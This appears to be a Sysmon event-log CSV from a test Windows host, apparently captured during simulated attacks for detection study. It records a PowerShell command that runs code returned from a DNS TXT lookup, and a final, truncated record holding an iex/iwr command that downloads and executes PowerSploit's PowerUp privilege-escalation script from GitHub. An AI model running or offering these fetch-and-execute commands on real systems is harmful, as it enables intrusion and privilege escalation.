Channel,CommandLine,Company,Computer,CreationUtcTime,CurrentDirectory,Description,DestinationHostname,DestinationIp,DestinationIsIpv6,DestinationPort,DestinationPortName,Details,EventID,EventRecordID,EventType,FileVersion,Hashes,Image,Initiated,IntegrityLevel,Keywords,Level,LogonGuid,LogonId,Opcode,OriginalFileName,ParentCommandLine,ParentImage,ParentProcessGuid,ParentProcessId,ParentUser,ProcessGuid,ProcessID,ProcessId,Product,Protocol,QueryName,QueryResults,QueryStatus,RuleName,SourceHostname,SourceIp,SourceIsIpv6,SourcePort,SourcePortName,SystemTime,TargetFilename,TargetObject,Task,TerminalSessionId,ThreadID,User,UserID,UtcTime,Version,raw
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\whoami.exe""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,whoami - displays logged on user information,,,,,,,1,19672,,10.0.22621.1 (WinBuild.160101.0800),"MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292",C:\Windows\System32\whoami.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,whoami.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" . whoami",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{f57bd86a-78f0-658c-0302-000000000f00},1708,WINDEV2309EVAL\User,{f57bd86a-78f1-658c-0402-000000000f00},3588,11120,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T19:20:17.1713008Z,,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 19:20:17.170,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T19:20:17.1713008Z""/>
      
            
      <EventRecordID>19672</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 19:20:17.170</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-78f1-658c-0402-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">11120</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\whoami.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">whoami - displays logged on user information</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">whoami.exe</Data>
      
            
      <Data Name=""CommandLine"">""C:\Windows\system32\whoami.exe""</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292</Data>
      
            
      <Data Name=""ParentProcessGuid"">{f57bd86a-78f0-658c-0302-000000000f00}</Data>
      
            
      <Data Name=""ParentProcessId"">1708</Data>
      
            
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" . whoami</Data>
      
            
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 19:20:16.564,,,,,,,,,11,19671,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-78f0-658c-0302-000000000f00},3588,1708,,,,,,-,,,,,,2023-12-27T19:20:16.5709536Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_b4clkqli.c1u.ps1,,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 19:20:16.564,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>11</EventID>
      
            
      <Version>2</Version>
      
            
      <Level>4</Level>
      
            
      <Task>11</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T19:20:16.5709536Z""/>
      
            
      <EventRecordID>19671</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 19:20:16.564</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-78f0-658c-0302-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">1708</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_b4clkqli.c1u.ps1</Data>
      
            
      <Data Name=""CreationUtcTime"">2023-12-27 19:20:16.564</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" . whoami",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,,1,19670,,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,"""powershell.exe"" & {# creating a custom nslookup function that will indeed call nslookup but forces the result to be \""""whoami\""""
# this would not be part of a real attack but helpful for this simulation
function nslookup  { &\""""$env:windir\system32\nslookup.exe\"""" @args | Out-Null; @(\""""\"""",\""""whoami\"""")}
powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{f57bd86a-78ef-658c-0002-000000000f00},10540,WINDEV2309EVAL\User,{f57bd86a-78f0-658c-0302-000000000f00},3588,1708,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T19:20:16.4866578Z,,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 19:20:16.485,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T19:20:16.4866578Z""/>
      
            
      <EventRecordID>19670</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 19:20:16.485</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-78f0-658c-0302-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">1708</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows PowerShell</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      
            
      <Data Name=""CommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" . whoami</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      
            
      <Data Name=""ParentProcessGuid"">{f57bd86a-78ef-658c-0002-000000000f00}</Data>
      
            
      <Data Name=""ParentProcessId"">10540</Data>
      
            
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {# creating a custom nslookup function that will indeed call nslookup but forces the result to be \""""whoami\""""
# this would not be part of a real attack but helpful for this simulation
function nslookup  { &amp;\""""$env:windir\system32\nslookup.exe\"""" @args | Out-Null; @(\""""\"""",\""""whoami\"""")}
powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]}</Data>
      
            
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\nslookup.exe"" -q=txt example.com 8.8.8.8",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,nslookup,,,,,,,1,19669,,10.0.22621.1 (WinBuild.160101.0800),"MD5=E1AD42845D19FC9CBFA7D6167D2EC709,SHA256=ED7C553EF847D0E6B42969D56D84ECDA77D4770131F70661FD430C34D2BCCB94,IMPHASH=EC3E3C718C086FAB4F7F35008A5E9116",C:\Windows\System32\nslookup.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,nslookup.exe,"""powershell.exe"" & {# creating a custom nslookup function that will indeed call nslookup but forces the result to be \""""whoami\""""
# this would not be part of a real attack but helpful for this simulation
function nslookup  { &\""""$env:windir\system32\nslookup.exe\"""" @args | Out-Null; @(\""""\"""",\""""whoami\"""")}
powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{f57bd86a-78ef-658c-0002-000000000f00},10540,WINDEV2309EVAL\User,{f57bd86a-78f0-658c-0202-000000000f00},3588,8672,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T19:20:16.2678005Z,,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 19:20:16.263,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T19:20:16.2678005Z""/>
      
            
      <EventRecordID>19669</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 19:20:16.263</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-78f0-658c-0202-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">8672</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\nslookup.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">nslookup</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">nslookup.exe</Data>
      
            
      <Data Name=""CommandLine"">""C:\Windows\system32\nslookup.exe"" -q=txt example.com 8.8.8.8</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=E1AD42845D19FC9CBFA7D6167D2EC709,SHA256=ED7C553EF847D0E6B42969D56D84ECDA77D4770131F70661FD430C34D2BCCB94,IMPHASH=EC3E3C718C086FAB4F7F35008A5E9116</Data>
      
            
      <Data Name=""ParentProcessGuid"">{f57bd86a-78ef-658c-0002-000000000f00}</Data>
      
            
      <Data Name=""ParentProcessId"">10540</Data>
      
            
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {# creating a custom nslookup function that will indeed call nslookup but forces the result to be \""""whoami\""""
# this would not be part of a real attack but helpful for this simulation
function nslookup  { &amp;\""""$env:windir\system32\nslookup.exe\"""" @args | Out-Null; @(\""""\"""",\""""whoami\"""")}
powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]}</Data>
      
            
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 19:20:15.578,,,,,,,,,11,19668,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-78ef-658c-0002-000000000f00},3588,10540,,,,,,-,,,,,,2023-12-27T19:20:15.5879290Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_2fztg4ys.l53.ps1,,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 19:20:15.578,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>11</EventID>
      
            
      <Version>2</Version>
      
            
      <Level>4</Level>
      
            
      <Task>11</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T19:20:15.5879290Z""/>
      
            
      <EventRecordID>19668</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 19:20:15.578</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-78ef-658c-0002-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10540</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_2fztg4ys.l53.ps1</Data>
      
            
      <Data Name=""CreationUtcTime"">2023-12-27 19:20:15.578</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {# creating a custom nslookup function that will indeed call nslookup but forces the result to be \""""whoami\""""
# this would not be part of a real attack but helpful for this simulation
function nslookup  { &\""""$env:windir\system32\nslookup.exe\"""" @args | Out-Null; @(\""""\"""",\""""whoami\"""")}
powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,,1,19667,,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-78ef-658c-0002-000000000f00},3588,10540,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T19:20:15.4857229Z,,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 19:20:15.484,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T19:20:15.4857229Z""/>
      
            
      <EventRecordID>19667</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 19:20:15.484</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-78ef-658c-0002-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10540</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows PowerShell</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      
            
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {# creating a custom nslookup function that will indeed call nslookup but forces the result to be \""""whoami\""""
# this would not be part of a real attack but helpful for this simulation
function nslookup  { &amp;\""""$env:windir\system32\nslookup.exe\"""" @args | Out-Null; @(\""""\"""",\""""whoami\"""")}
powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]}</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">1688</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,,22,19666,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-78c6-658c-fe01-000000000f00},3588,10488,,,raw.githubusercontent.com,::ffff:185.199.108.133;::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.109.133;,0,-,,,,,,2023-12-27T19:19:37.1787801Z,,,22,,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:55:41.663,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>22</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>22</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T19:19:37.1787801Z""/>
      
            
      <EventRecordID>19666</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 14:55:41.663</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-78c6-658c-fe01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10488</Data>
      
            
      <Data Name=""QueryName"">raw.githubusercontent.com</Data>
      
            
      <Data Name=""QueryStatus"">0</Data>
      
            
      <Data Name=""QueryResults"">::ffff:185.199.108.133;::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.109.133;</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,cdn-185-199-108-133.github.com,185.199.108.133,false,443,https,,3,19665,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,true,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-78c6-658c-fe01-000000000f00},3588,10488,,tcp,,,,-,WinDev2309Eval.localdomain,192.168.126.163,false,50119,-,2023-12-27T19:19:36.4438001Z,,,3,,5136,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:55:41.669,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>3</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>3</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T19:19:36.4438001Z""/>
      
            
      <EventRecordID>19665</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5136""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 14:55:41.669</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-78c6-658c-fe01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10488</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""Protocol"">tcp</Data>
      
            
      <Data Name=""Initiated"">true</Data>
      
            
      <Data Name=""SourceIsIpv6"">false</Data>
      
            
      <Data Name=""SourceIp"">192.168.126.163</Data>
      
            
      <Data Name=""SourceHostname"">WinDev2309Eval.localdomain</Data>
      
            
      <Data Name=""SourcePort"">50119</Data>
      
            
      <Data Name=""SourcePortName"">-</Data>
      
            
      <Data Name=""DestinationIsIpv6"">false</Data>
      
            
      <Data Name=""DestinationIp"">185.199.108.133</Data>
      
            
      <Data Name=""DestinationHostname"">cdn-185-199-108-133.github.com</Data>
      
            
      <Data Name=""DestinationPort"">443</Data>
      
            
      <Data Name=""DestinationPortName"">https</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 19:19:34.138,,,,,,,,,11,19664,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-78c6-658c-fe01-000000000f00},3588,10488,,,,,,-,,,,,,2023-12-27T19:19:34.1394413Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_hsbau1hc.u1n.ps1,,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 19:19:34.138,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>11</EventID>
      
            
      <Version>2</Version>
      
            
      <Level>4</Level>
      
            
      <Task>11</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T19:19:34.1394413Z""/>
      
            
      <EventRecordID>19664</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 19:19:34.138</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-78c6-658c-fe01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10488</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_hsbau1hc.u1n.ps1</Data>
      
            
      <Data Name=""CreationUtcTime"">2023-12-27 19:19:34.138</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
